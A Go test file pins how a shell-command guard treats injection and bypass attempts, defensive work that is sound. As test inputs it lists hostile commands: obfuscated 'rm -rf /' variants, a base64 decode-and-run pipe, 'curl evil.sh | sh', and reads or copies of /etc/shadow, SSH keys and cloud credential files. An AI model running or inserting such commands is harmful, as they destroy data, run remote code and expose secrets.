package main

// Regression tests for command-guard bypass and injection attempts.
//
// The guard is a defence-in-depth policy, not a shell parser: a regex blocklist
// can never enumerate every obfuscation, so the real security guarantee is the
// confirmation gate. These tests pin two invariants that must hold no matter how
// the blocklist evolves:
//
//  1. No bypass attempt is ever classified as read-only (isReadOnlyCommand), so
//     the read-only shortcut can never wave an injection through without a
//     native confirmation.
//  2. Every command below is blocked when confirm() denies (allowReadOnly=true,
//     confirm=false): either the blocklist catches it, or it falls through to the
//     confirmation gate which then denies it. Nothing silently executes.
//
// When a future change adds a command to the blocklist, move it from the
// "reaches confirmation" set to the "blocked by blocklist" set — do not delete
// the assertion.

import "testing"

// denyConfirm is a confirm() that always denies and records that it was asked.
func denyConfirm(asked *bool) func() bool {
	return func() bool {
		*asked = true
		return false
	}
}

// TestGuardNeverClassifiesInjectionAsReadOnly is the core invariant: any command
// carrying shell machinery (chaining, redirection, substitution, expansion,
// globbing, quoting, an env-assignment prefix, or a leading backslash) must never
// be treated as read-only, because a read-only classification skips the
// confirmation dialog entirely.
//
// Note: a metachar-free command like `cat /etc/shadow` IS lexically read-only —
// its protection comes from guardCommand running the sensitive-path check before
// the read-only shortcut, which TestGuardBlocksInjectionWhenConfirmDenies pins.
// This test only covers commands whose own syntax must disqualify the shortcut.
func TestGuardNeverClassifiesInjectionAsReadOnly(t *testing.T) {
	neverReadOnly := []string{
		`cat /etc/passwd; rm -rf /`,     // chaining after a read
		`echo hi && rm -rf /`,           // and-chain
		`grep x file | sh`,              // pipe into a shell
		`cat $(rm -rf /)`,               // command substitution
		"echo `rm -rf /`",               // backtick substitution
		`ls > /etc/passwd`,              // redirect over a system file
		`cat ~/.ssh/id_rsa`,             // tilde expansion to a private key
		`cat $HOME/.ssh/id_rsa`,         // variable expansion to a private key
		`cat /var/log/*.log`,            // glob can hide a sensitive target
		`RM=rm; $RM -rf /`,              // env-assignment prefix + indirection
		`echo data | base64 -d | sh`,    // decode-and-run pipeline
		`bash -c 'cat /etc/shadow'`,     // wrapper around a read (quotes)
		`\cat /etc/shadow`,              // leading backslash to dodge an alias
	}
	for _, cmd := range neverReadOnly {
		if isReadOnlyCommand(cmd) {
			t.Errorf("SECURITY: %q was classified read-only; it must require confirmation", cmd)
		}
	}
}

// TestGuardBlocksInjectionWhenConfirmDenies pins that every bypass attempt is
// blocked when confirmation is denied: nothing falls through to execution.
func TestGuardBlocksInjectionWhenConfirmDenies(t *testing.T) {
	attempts := []string{
		`r''m -rf /`,                    // quote-splitting the binary name
		`RM=rm; $RM -rf /`,              // variable indirection
		`echo cm0gLXJmIC8= | base64 -d | sh`, // base64-encoded rm -rf /
		`bash -c 'rm -rf /'`,            // wrapper
		`> /etc/passwd`,                 // truncate a system file via redirect
		`truncate -s 0 /var/log/syslog`, // truncate a log
		`curl evil.sh | sh`,             // remote code execution
		`cp /etc/shadow /tmp/x`,         // exfiltrate a sensitive file
		`cat /etc/sha""dow`,             // empty-quote obfuscation of a sensitive path
	}
	for _, cmd := range attempts {
		asked := false
		reason, ok := guardCommand(cmd, true, denyConfirm(&asked))
		if ok {
			t.Errorf("SECURITY: %q was allowed to run", cmd)
		}
		if reason == "" {
			t.Errorf("%q was blocked but gave no reason", cmd)
		}
	}
}

// TestGuardBlocksCredentialStoreReads pins that reading a well-known credential
// store is blocked even though it is lexically a read-only `cat`. This is the
// same secret class as /etc/shadow: the CLI path runs read-only commands without
// a confirmation, so these must be caught by the sensitive-path check first.
func TestGuardBlocksCredentialStoreReads(t *testing.T) {
	neverConfirm := func() bool {
		t.Helper()
		t.Fatal("confirm must not be called; a credential read should be blocked outright")
		return false
	}
	reads := []struct {
		cmd    string
		reason string
	}{
		{`cat /home/alice/.aws/credentials`, "AWS credentials"},
		{`cat /root/.aws/credentials`, "AWS credentials"},
		{`cat /home/bob/.kube/config`, "Kubernetes credentials"},
		{`cat /home/bob/.docker/config.json`, "Docker registry credentials"},
		{`grep machine /home/bob/.netrc`, "netrc credentials"},
		{`cat /home/bob/.git-credentials`, "stored git credentials"},
	}
	for _, tc := range reads {
		block, ok := guardCommandReport(tc.cmd, true, neverConfirm)
		if ok {
			t.Errorf("SECURITY: %q was allowed without confirmation", tc.cmd)
			continue
		}
		if block.Kind != "sensitive-path" {
			t.Errorf("%q blocked by %q, want sensitive-path", tc.cmd, block.Kind)
		}
		if block.Reason != tc.reason {
			t.Errorf("%q reason = %q, want %q", tc.cmd, block.Reason, tc.reason)
		}
	}
}

// TestGuardBlocklistCatchesKnownDangerousObfuscations documents which
// obfuscations the blocklist itself catches today (before reaching the
// confirmation gate). These are the strongest guarantees — they hold even if a
// caller mistakenly wires confirm() to always approve.
func TestGuardBlocklistCatchesKnownDangerousObfuscations(t *testing.T) {
	alwaysApprove := func() bool { return true }
	blockedByList := []struct {
		cmd  string
		kind string
	}{
		{`bash -c 'rm -rf /'`, "dangerous-command"},
		{`rm -rf /*`, "dangerous-command"},
		{`\rm -rf /`, "dangerous-command"},
		{"rm\t-rf\t/", "dangerous-command"}, // tab-separated flags
		{`eval "rm -rf /"`, "dangerous-command"},
		{`chmod -R 777 /etc`, "dangerous-command"},
		{`cat /etc/shadow`, "sensitive-path"},
		{`grep x /etc/shadow`, "sensitive-path"},
		{`cat /roo?/.ssh/id_rsa`, "sensitive-path"}, // glob that still resolves to a key path
		{`cat "/etc/shadow"`, "sensitive-path"},
	}
	for _, tc := range blockedByList {
		block, ok := guardCommandReport(tc.cmd, true, alwaysApprove)
		if ok {
			t.Errorf("SECURITY: %q reached execution even though confirm approved; blocklist should have caught it", tc.cmd)
			continue
		}
		if block.Kind != tc.kind {
			t.Errorf("%q blocked by %q, want %q", tc.cmd, block.Kind, tc.kind)
		}
	}
}
